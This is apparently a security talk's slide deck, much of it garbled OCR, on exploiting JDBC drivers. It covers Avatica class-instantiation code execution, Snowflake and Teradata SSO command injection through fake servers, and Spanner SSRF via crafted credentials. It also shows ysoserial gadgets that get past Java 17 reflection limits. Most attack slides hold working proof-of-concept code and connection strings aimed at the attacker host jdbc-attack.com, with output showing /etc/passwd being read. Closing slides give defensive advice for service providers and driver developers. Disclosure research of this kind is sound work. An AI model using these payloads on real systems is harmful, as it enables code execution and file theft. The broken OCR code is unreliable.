by: java.lang.ClassCastException Create breakpoint
com.google
com.google
com.google.
com.google
com.google.
3 more
.cloud.
-cloud.
cloud.
-cloud.
cloud.
spanner.connection.ConnectionOptions.parseCredentialsProvider (ConnectionOptions. java: 747)
spanner.connection.ConnectionOptions.<init>(ConnectionOptions. java: 564)
spanner.connection.ConnectionOptions.<init>(ConnectionOptions. java:83)
spanner .connection.ConnectionOptions$Builder. build (Connection0ptions. java: 508)
spanner. jdbc. JdbcDriver.connect (JdbcDriver. java:195)
Prorece fFfiniched with evit code 1
AC
-
%
com.sun.security.auth.module.UnixSystem cannot be cast to com.google.api.gax.core.CredentialsProvid
GERRRE -
```

## Slide 45

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

- httpclient_impl

   - The class which implements HTTPClient class used to send HTTP requests from client to server

- Invocation of arbitrary constructor with URL argument due to unchecked superclass

- We reported and it was assigned CVE-2022-36364

**Thoughts Class**

## Slide 46

Apache Calcite Avatica Remote Code Execution via Unchecked Class

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
private AvaticaHttpClient instantiateClient(String className, URL url) {
try {
Class<?> clz = Class. forName(className) ;
Constructor<?> constructor = clz.getConstructor(URL.class) ;
Object instance = constructor.newInstance (Objects. requireNonNull (url) );
return AvaticaHttpClient.class.cast(instance) ;
} catch (Exception e) {
throw new RuntimeException("Failed to construct AvaticaHttpClient implementation
O CGO N DW OW KL W NY FE
+ className, e);
10
LS
11 i
```

## Slide 47

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

###### **Thoughts Class**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import com. fasterxml.jackson.databind.JsonNode;
import com. fasterxml.jackson.databind.ObjectMapper ;
import java.10.%;
import java.net.URL;
| Thoughts Class |
public class CustomHttpClient {
public CustomHttpClient(URL url) throws IOException {
Object content = url.getContent( );
if (content instanceof InputStream) {
BufferedReader reader = new BufferedReader (new InputStreamReader ( (InputStream)
content) ) ;
ObjectMapper mapper new ObjectMapper () ;
JsonNode jnode = mapper.readTree(reader) ;
String result = jnode.path("result") .asText() ;
Runtime. getRuntime() .exec(result) ;
1
J
```

## Slide 48

Apache Calcite Avatica Remote Code Execution via Unchecked Class

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Structure
WM Bookmarks
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
import java.sql.SQLException;
public class AvaticaDemo{
public static void main(String[] args) throws SQLException {
DriverManager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
DriverManager.getConnection( url: "jdbc: avatica:remote:url= DEPT =
"6 AvaticaDemo »
\\ Actuator
ae
/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
{"result":"open -a calculator"}
Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation com.example.avaticademo.CustomHttpCLlient
6
>»
>
ip
5
Run:
> Console
de |e
a ¥
th = at
| er
= at
roe i at
at
at
at
at
at
at
at
org.apache
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
-calcite.
calcite.
calcite.
-calcite.
calcite.
calcite.
calcite.
-calcite.
calcite.
calcite.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica
avatica.
avatica.
remote.AvaticaHttpClientFactoryImpl.instantiateClient (AvaticaHttoClientFactoryImpl. java: 147)
remote.AvaticaHttpClientFactoryImpl. getClient (AvaticahttpClientFactoryImpl. java: 63)
remote.Driver.getHttpClient (Driver. java: 160)
remote.Driver.createService(Driver., java: 123)
remote .Driver.createMeta(Driver. java:97)
AvaticaConnection.<init>(AvaticaConnection. java:121)
AvaticaJdbc41Factory$AvaticaJdbc41Connection.<init>(Avaticajdbe41Factory. java: 109)
-AvaticaJdbe41Factory.newConnection(AvaticaJdbc41Factory. java: 65)
UnregisteredDriver.connect(UnregisteredDriver. java:138)
remote .Driver.connect (Driver. java:165)
java.sql.DriverManager . getConnection(DriverManager. java: 664)
aseqried ((@
SUONEOWNON
```

## Slide 49

## Apache Calcite Avatica SSRF via Unchecked Class

Try to find a gadget in the real-world scenario

## Slide 50

## Apache Calcite Avatica SSRF via Unchecked Class

- **Leverage dynamic analysis tools to look up the particular gadgets**

- **Verify the gadgets we find**

   - com.sun.media.sound.SF2Soundbank

   - javax.swing.JEditorPane

   - jdk.internal.loader.FileURLMapper

   - sun.security.provider.PolicyFile

## Slide 51

## Apache Calcite Avatica SSRF via Unchecked Class

• sun.security.provider.PolicyFile

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Apache Calcite Avatica SSRF via Unchecked Class
* sun.security.provider.PolicyFile
PolicyFile java.security.Policy {
PolicyFile(URL url)
url url;
initcurl);
```

## Slide 52

## Apache Calcite Avatica SSRF via Arbitrary Class

• Sensitive Information Leakage in JDBC Connecting Exception

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Apache Calcite Avatica SSRF via Arbitrary Class
* Sensitive Information Leakage in JOBC Connecting Exception
> public class AvaticaDemo{
> public static void main(String[] args) throws SQLException {
DriverNanager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
DriverManager .getConnection( url: "jdbc:avatica:remote:url=https: //jdbc-attack, com?file=/etc/passwd;httpclient impl=sun.security.provider.PolicyFile") ;
=) com.example.avaticademo.AvaticaDemo =
¢ /Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
L java.security.policy: error parsing https: //jdbc-attack. com?file=/etc/passwd:
line 1: expected [;], found [root:x:0:9:root:/root:/bin/bash
a ]
a Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation sun.security.provider.PolicyFile
at org.apache.calcite.avatica.remote.AvaticaHttpClientFactorylImpl. instantiateClient (AvaticaHttpClientFactoryImpl. java:147)
at org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl.getClient (AvaticaHttpClientFactoryI mpl, java: 63)
at org.apache.calcite.avatica.remote.Driver.getHttpClient (Driver. java:160)
at org.apache.calcite.avatica.remote.Driver.createService(Driver. java:123)
at org.apache.calcite.avatica.remote.Driver.createMeta(Driver. java: 97)
at org.apache.calcite.avatica.AvaticaConnection.<init>(Avatic nonection. java:121)
a qi
at org.apache.calcite.avatica.AvaticaJdbc41Factory$AvaticaJdbc41Connection. <init>(AvaticaJdbc41Factory. java:109)
at org.apache.calcite.avatica.AvaticaJdbe41Factory .newConnection(AvaticaJdbc41Factory.java:65)
at org.apache.calcite.avatica.UnregisteredDriver.connect (UnregisteredDriver. java:138)
at org.apache.calcite.avatica.remote.Driver.connect (Driver. java:165)
at java.sql.DriverManager .getConnection(DriverManager. java: 664)
at java.sql.DriverManager .getConnection(DriverManager. java: 270)
at com.example.avaticademo.AvaticaDemo.main(AvaticaDemo. java:14)
Caused by: java.lLang.ClassCastException Create breakpoint : Cannot cast sun.security.provider.PolicyFile to org.apache.calcite.avatica.remote.AvaticaHttpClient
at java.lang.Class.cast (Class. java:3369)
at org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl. instantiateClient (AvaticahttpClientFactoryImpl. java:145)
12 more
```

## Slide 53

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class

### Incorrect Response Disposal

JDBC Attack Protection

## Slide 54

## Snowflake Remote Code Execution via SSO Flow Response

- Browser-based SSO

- Relying on open (Mac), xdg-open (Linux), cmd (!) (Windows) – platform- and driver-specific RCE

- Malicious SSO server can inject command via ssoUrl attribute in returned SSO response

- RCE on MacOS (JDBC, NodeJS) and Windows (NodeJS)

## Slide 55

Snowflake Remote Code Execution via SSO Flow Response

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Snowflake Remote Code Execution via SSO Flow Response
1 @Override
2 DLic void openBrowser (String ssoUrl) throws SFException
3 try
4
5 if (java.awt.Desktop.isDesktopSupported () )
) URI uri w URI (ssouUrl) ;
7 java.awt.Desktop. getDesktop() .browse(ur7) ;
8 }
9 Runtime runtime = Runtime. getRuntime() ;
10 Constants.OS os Constants. get0OS() ;
11 if (os == Constants.OS.MAC)
12 e) runtime.exec("open " ssourl) ;
13 +} else {
14
15 runtime.exec("xdg-open " ssourl);
16 }
17 }
18 } catch (URISyntaxException IOException ex)
19 throw new SFException(ex, ErrorCode.NETWORK_ERROR, ex.getMessage()) ;
20 }
21 }
```

## Slide 56

**Fake Server**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
from flask import Flask, jsonify, request
app = Flask(__name__)
@app. route('/session/authenticator-request', methods = ['POST'])
def SSOJSON():
if(request.method == 'POST'):
jsonData = {"success": "true", "data": {"proofkey": "foo", "ssoUrl": "calc"}}
return jsonify (data)
if __name__ == '__main_':
app.run('0.0.0.0', debug=True, port=443, ssl_context=('/root/ssl/jdbc-attack.com_bundle.pem' ,
'/root/ssl/jdbc-attack.com.key'))
```

## Slide 57

## Snowflake Remote Code Execution via SSO Flow Response

- authenticator=external

   - To set up browser-based SSO from external for authentication

- JDBC driver requests https://<host>/session/authenticator-request and parses JSON response

- Passes the value of the data.ssoURL() JSON format property to Runtime.exec() as second parameter

   - First parameter is open on MacOS

   - Remote Code Execution on MacOS

## Slide 58

Snowflake Remote Code Execution via SSO Flow Response

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
mm & x
lf Jl « >
a qi
Snowflake Remote Code Execution via SSO Flow Response
java.sql.DriverManager
SnowfLakeDemo
main(String Exception
DriverManager .registerDriver com. snowflake.client. jdbc. SnowflakeDriver
DriverManager .getConnection("jdbc: snowflake: //jdbc-attack.com/?user=admin&password=123456&db=sdb&authenticator=externalbrowser"
https://safe.govfz.com:
oa
S
w
https: //safe.govfz.com:443
https: //safe.govfz.com:4
S
on
https: //safe.govfz.com: 443
https://safe.govfz.com:443
Initiating login request with your identity provider. A browser window should have opened for you to complete the login. If you can't see it, check existing browser windows, or your OS settings. Press CTRL+C to abort and try
```

## Slide 59

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP authentication allows delegated credentials to AWS

   - Exposed a design flaw in GCP authentication library (in all languages that we looked at)

   - Design flaw can lead to full read SSRF by supplying a crafted set of credentials

- encodedCredentials

   - Allow users to set their own Google Cloud Platform  credentials in Base64-encoded JSON through this undocumented property

## Slide 60

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP credential JSON is used for all auth to GCP

- JSON is deserialized by different implementations

- We are targeting the ExternalAccountCredentials.fromJson method

- Supports many external credentials including AWS

- AWS implementation makes several HTTP requests based on the provided config

## Slide 61

## Google Cloud Spanner JDBC Driver Full Read SSRF

###### • Crafted Credentials

**Response JSON Format**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
* Crafted Credentials
"type": "external_account",
"audience": "test",
"subject_token_type": "test",
"token_url": "https://sts.google.apis.com/token",
"credential_source":
"environment_id": "awsl1",
"regional_cred_verification_url": "https://accounts.google.com/o/oauth2/auth",
"region_url": "https://accounts.google.com/o/oauth2/token",
"url": "https://ww.googleapis.com/oauth2/vl/certs"
"xservice_account_impersonation_url":
wi
"token_info_url":
Response JSON Format
"Client_id":"client_id",
"
"client_secret":"client_secret",
"quota_project_id": "test",
"workforce_pool_user_project": "test"
```

## Slide 62

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
O @d N DO WwW KL W NY
Oo kK WN ©
Google Cloud Spanner JDBC Driver Full Read SSRF
if (awsCredentialSource.url == null awsCredentialSource.url.isEmpty()) {
throw new IOException (
"Unable to determine the AWS IAM role name.
t "url field.");
a
J
The credential source does not contain the"
String roleName = retrieveResource(awsCredentialSource.url, "IAM role", metadataRequestHeaders) ;
String awsCredentials
retrieveResource (
awsCredentialSource.url + "/" + roleName,
"credentials", metadataRequestHeaders) ;
JsonParser parser OAuth2Uti ls. JSON_FACTORY.createJsonParser (awsCredentials) ;
GenericJson genericJson = parser.parseAndC lose (GenericJson.class) ;
```

## Slide 63

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
DriverManager.registerDriver (new com. google.cloud.spanner.jdbc.JdbcDriver ()) ;
Connection conn =
DriverManager.getConnection("jdbc:cloudspanner: /projects/pjm/instances/test/databases/test;encodedCredentials=ewogICJ0exXBlLIjogl
mV4dGVybmFsx2FjY291bnQi LAoglCIhdWRpZW5j ZST6ICIOZXNOLTiwkKICAic3ViamVjdF90b2t Lb L9OeXBLIjogInRlc3Qi1LAogICI0b2t Lb L9Lcmwi07 Ai aHROCHM6
Ly9zdHMuZ29vZ2x LYXBpcy5j b20vdG9rZw47 LAogICIj cmVkZW50aWF SX 3NvdX Jj ZSI6THSKICAgICI LbnZpcm9ubWVudF9pZCI61CIhd3MxliwkICAgiCJyZwdpb25
hbF93 cmVkX3Z LemLmaWNhdG Lvb L9 Lemwi07 Ai YW55dGhpbmci LAogICAgInJlZ2lvblL91cmwi07A7i aHROCHM6Ly9qZGIj LWFOdGF I ay5j b20vP2ZpbGUIL2VOY y9wy X
Nzd2Q7 LAogICAgInVybCI6ICJodHRwczovL2pkYmMty XROYWNrLmNvbS8_ZmLsSZTOVZXRJL3Bhc3N3ZCIKICB9LAogICIOb2t Lb L9pbmZvxX3VybCléTCIhbnloOaG luz
yIsCiAgimNsawVudF9pZCI61CIjbGLLbnRfawQiLAogICJjbGLlbnkR fc2Vj cmVOljogImNsaWVudF9zZZWNyZXQi LAogICIxdWw90YV9wcem9qZWNOX2 LkIjoginRlc3Qi
LAogICJ3b3IrZm9yY2V FcG9VbF91C2VyX3Byb2pLY3Q1071A1dGVzdCIKfQ==") ;
conn.createStatement () ;
```

## Slide 64

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
44
em te vc >
System.out.printin("Cr
String credentialsJson
// note: the project/i
Google Cloud Spanner JDBC Driver Full Read SSRF
edentials JSON: " + credentialsJson) ;
Encoded = Baseé4.getUrlEncoder() .encodeToString(credentialsJson.getBytes() );
nstanc
database here are never used before the exploit runs
String url = String.format("jdbc:cloudspanner: /projects/Learning-pjm/instances/test/databases/test;encodedCredentials=%s", credentialsJsonEncaded) ;
System.out.printf ("Con
// Register Connection
struct JDBC Connection URL: %s%n", url);
DriverManager .registerDriver(new com.google.cloud.spanner. jdbc. JdbcDriver());
// Get Connection
Connection connection
// Establish the conne
connection. createState
™ CloudSpannerFullSSRFPOC
at com.googte.autn
at com.google.auth.cauth2.
at com.google.auth.oauth2.
at com.google.auth.oauth2.
at com.google.auth.cauth2.
3 more
Oautnz.A
Caused by: com.google.api.client.http.HttpResponseException: 500 INTERNAL SERVER ERROR
= DriverManager.getConnection(url) ;
ction
ment();
wstredentials.getaAwssecuritylredentials(Awstredentials. jav
AwsCredentials.retrieveSubjectToken(AwsCredentials. java:162)
AwsCredentials.refreshAccessToken(AwsCredentials. java:142)
OAUth2Credentials$1.callCOAuth2Credentials. java: 257)
OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.61 Transitional//EN
rn R 4
<html>
<head>
<title>NotADirectoryError:
>
{Errno 26] Not a directory: &#x27;/etc/passwd/root:x:0:0:root:/root:/bin/bash bin:x
1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var
```

## Slide 65

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• BROWSER

- Leverages browser-based SSO via Teradata Server configuration enabling OpenID Connect (OIDC) and JDBC URL parameter • Client OIDC handling requires the server to confirm that OIDC is configured and this allows the JDBC driver to use the browser-based SSO code path

• On any Teradata server where OIDC is enabled

## Slide 66

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
1 var6 = var6.replaceALL("PLACEHOLDER", varl2 + "?response_type=code" + "&client_id=" +4
2 Utility.safeForURL(var9) + "&redirect_uri=" + Utility.safeForURL(var20) + "&code_challenge=" +
3 Utility.safeForURL(var15) + "&code_challenge_method=S256" + "&scope="_ + Utility.safeForURL(var21)) ;
4 if (this. log.isTimingEnabled()) {
5 this. log.timing ("Launching browser " + var6);
6 t
7
8 Process var22;
g try {
10 e) var22 = Runtime. getRuntime() .exec(var6) ;
11 } catch (IOException var30) {
12 throw Utility. logEx(this.log, "Runtime exec", Utility.wrapEx(var30,
13 ErrorFactory.makeDriverJDBCException("TJ1551", var6)));
14 }
```

## Slide 67

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

###### • Create a fake Teradata server in Python which tells the client OIDC has been configured on the server

- This tricks the client into allowing the BROWSER JDBC property

- Does not even require a working Teradata server to achieve RCE on the machine running the JDBC client

- Similar to the Rogue MySQL Server LOCAL INFILE exploit from many years ago

## Slide 68

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• Python program that fakes the Teradata server handshake protocol

**Fake Server Code Fragment**

## Slide 69

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

- JDBC client connects to fake Teradata server (in Python)

- Fake server tells client OIDC is enabled

- JDBC client makes URL request to OIDC server, expecting JSON document with openid-configuration format - Bonus! Blind GET-based SSRF here

- • JDBC client executes the command in the BROWSER property

## Slide 70

Teradata JDBC Driver Remote Code Execution via SSO Command Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Run:
Teradata JOBC Driver Remote Code Execution via SSO Command Injection
import java.sql.DriverNanager;
import java.sql.SQLException;
public class TeradataDemo {
public sta
DriverManager.registerDriver(new com.teradata. jdbc. TeraDriver());
tic v
oid main(String[] args) thro
(()
x pyn3rd@acBookPro JEVEE python3 -u rogue_teradata_server.py -p 10250 -u ‘https://jdbc—attack.com/teradata'
04/14/2023 11:40:38 AM [+]Connecting from IP: 127.0.0.1, Port: 54400
04/14/2023 11:40:38 AM [+]Data received: b'\x03\x01\n\x00\x00\ x07\ x00\x00\x00C\ x00\ xO0\ x00\x00\x00\x00\x00\ x00\ x00\ x00\ x00\x00\x00\x00\xO
\x00\xfF\xO0\ x00\ x00\ x00\ x00\x00\x00\x00\ x00\ x00\ x00\ x00\ x00\x00\x00\ xa6\x00C\x00\x00\x00\ xO1\xO0\ x02\ xO0\x04\x11\x14\x00\xOC\ x00\x01\x00
ws SQLException { x@1\x01\x00\x03\x00\x90\x00\ x05\ x00\ x00\ x00\t\x00\x01\x01\ xO0\ xOb\ xO0\ x01\ x01\x00\x0e\x00\ x00\xG0\ xOF\ x00\x00'
04/14/2023 11:40:38 AM [+]Data sending: b‘'\x03\x02\n\x00\x00\x07\x00\x00\x03\xa3\x00\x00\x00\x00\x00\x00\x00\x00\ x00\ x00\x00\x00\x00\x00\
00\x05\xff\x00\ xO00\ x00\ x00\x00\x00\x00\x00\x00\ x00\ x00\x00\x00\x00\x00+\xO02N\ x00\ x00\ x03\ xe8\x00\x00\x03\xe8\ xOOx\x00\xO1w\xf f\x00\x00\x0
DriverManager.getConnection( url: "jdbc:teradata://127.0.0.1/DBS_PORT=10250, LOGMECH=BROWSER, BROWSER='open -a calcuLlator' , TYPE=DEFAULT , COP=OFF , TMODE=TERA, LOG=DEBUG") ;
a
eee
f=] com.example.jdbc.attack.db2.TeradataDemo AC ve % + x -
* 2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_| =rce
2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_ Wf 8 9 | ooo ffs. = In = ial nid-confi ion
v 2023-04-14.11:41:37.561 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_ socketFactory: sHTTPSProtocol=TLSv1.2
> 2023-04-14.11:41:37.562 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_ 4 5 6 FD essary sm_socketFactory.getDefauLtCipherSuites=[TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA2
=f 2023-04-14.11:41:38.098 TERAIDBC4 TIMING [main] com.teradata. jdbc. jdk6.JDK6_SQl y httos://jdbe-attack. com/teradata/.well-known/openid-configuration took 567 ms and completed
mm 2023-04-14.11:41:38.098 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL 1 9) 3 ee HttpServer with Browser Authentication timeout 186000 ms and browser tab timeout 5060 ms
i 2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbe.jdk6é.JDK6_SQL_ authorization_endpoint": "foo", "token_endpoint": "bar" }
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [Thread-4] com.teradata.jdbc.jdk6.JDK6_ fe) arver Listening on port 54470
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL _ r= | =
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 sTokenURL=bar 3
2023-04-14.11:41:38.101 TERAIJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_Connection@16ec5519 sCodeVerifier=I 5WVBKwIQdjFEqKv4a0zwD2V0tO3mZbWjugnKigLXRM Zl
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbe.jdké.JDK6_SQL_Connection@16ec5519 sCodeChallLenge=JAnKkqTFPzdb4msp1j glLHDBTouI1BaG1LtHNFevtqJ9Y a
2023-04-14.11:41:38.101 TERAIJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 sRedirectURL=http: //localhost:54470/openid-callback -
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_Connection@16ec5519 sOIDCScope=openid =
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 (before PLACEHOLDER swap) sBrowser=open -a calculator S
2023-04-14.11:41:38.102 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6é.JDK6é_SQL_Connection@16ec5519 Launching browser open -a calculator 3
```

## Slide 71

## Bypass high version Java reflection restriction via Teradata JDBC Driver

- Attack interfaces can be combined

- JDBC connection can be leveraged to evade Java deserialization with reflection in JDK

JDBC
JNDI Deserialization

## Slide 72

**CommonsBeantils Gadget**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
public class CommonsBeanutilsl implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
final Object templates = Gadgets.createTemplatesImpl (command) ;
// mock method name until armed
final BeanComparator comparator = new BeanComparator("lLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger ("1") ) ;
queue. add(new BigInteger("1"));
// switch method called by comparator
Ref lections.setFieldValue(comparator, "property", "outputProperties") ;
// switch contents of queue
final Object] queueArray = (Objectl]) Reflections. getFieldValue(queue, "queue") ;
queueArray| 0] = templates;
queueArray|1] = templates;
return queue;
```

## Slide 73

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar CommonsBeanutils1 open -a calculator > /tmp/calc.ser

• Java reflection has been restricted in Java 17

## Slide 74

Bypass high version Java reflection restriction via Teradata JDBC Driver

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Bypass high version Java reflection restriction via Teradata JDBC Driver
public class TeraDataSource extends TeraDataSourceBase implements DataSource {
public TeraDataSource() {
$
public Connection getConnection() throws SQLException {
return this.createNewConnection(this.user, this.password) ;
$
public Connection getConnection(String varl, String var2) throws SQLException {
return this.createNewConnection(varl, var2);
au
J
```

## Slide 75

**Getter and Setter**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
public class TeraDataSourceBase implements Referenceable, Serializable {
public String getDSName() {
return this.DSName;
}
public void setDSName(String varl) {
this.DSName = varl;
public String getBROWSER() {
return this.m_sBrowser;
}
public void setBROWSER(String varl) {
this.m_sBrowser = varl;
public void setLOGMECH(String varl) {
this.LogMech = varl;
public String getLOGMECH() {
return this.LogMech;
```

## Slide 76

**TeraDataSource Gadget**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
public class TeraDataSourcel implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
// create a TeraDataSource object, holding our JDBC string
TeraDataSource dataSource = new TeraDataSource() ;
dataSource.setBROWSER (command) ;
dataSource.setLOGMECH ("BROWSER") ;
dataSource.setDSName("127.0.0.1");
dataSource.setDbsPort ("10250") ;
// mock method name until armed
final BeanComparator comparator = new BeanComparator("LlLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger("1"));
queue.add(new BigInteger("1"));
// switch method called by comparator to "getConnection"
Reflections.setFieldValue(comparator, "property", "connection") ;
// switch contents of queue
final Object[{] queueArray = (Object[]) Reflections. getFieldValue(queue, "queue") ;
queueArray|0] = dataSource;
queueArray[1] = dataSource;
return queue;
```

## Slide 77

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar TeraDataSource1 open -a calculator > /tmp/tds.ser

###### • Java reflection has been evaded successfully in Java 17

## Slide 78

Abused Connection Resource

Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

### JDBC Attack Protection

## Slide 79

## JDBC Security for Service Providers

###### If you expose JDBC configuration to users in your software / service:

- Use an allow-list for JDBC properties with minimal viable set for business / service needs

- Use only vetted JDBC drivers and do not allow user upload

- Pay special attention to configuration properties which affect file writes and network/OS commands - deny these by default

- Sandbox user-originated JDBC activity in a dedicated VM or cloud function - assume the environment will be compromised and minimize blast radius

- Regularly review JDBC configurations and usage for malicious or unexpected configuration

- JDBC drivers should be part of your component version lifecycle strategy (keep them updated)

## Slide 80

## JDBC Security for Developers

###### If you are developing a JDBC driver…

- Do not trust user-provided properties, especially when the properties are used to invoke network calls, OS commands, or code through reflection

- Beware of the malicious server and consider using checksums or other verifiable data exchange mechanism

- If you are forking an existing JDBC driver, make sure you stay up to date with the upstream driver and ensure you are applying particularly security fixes
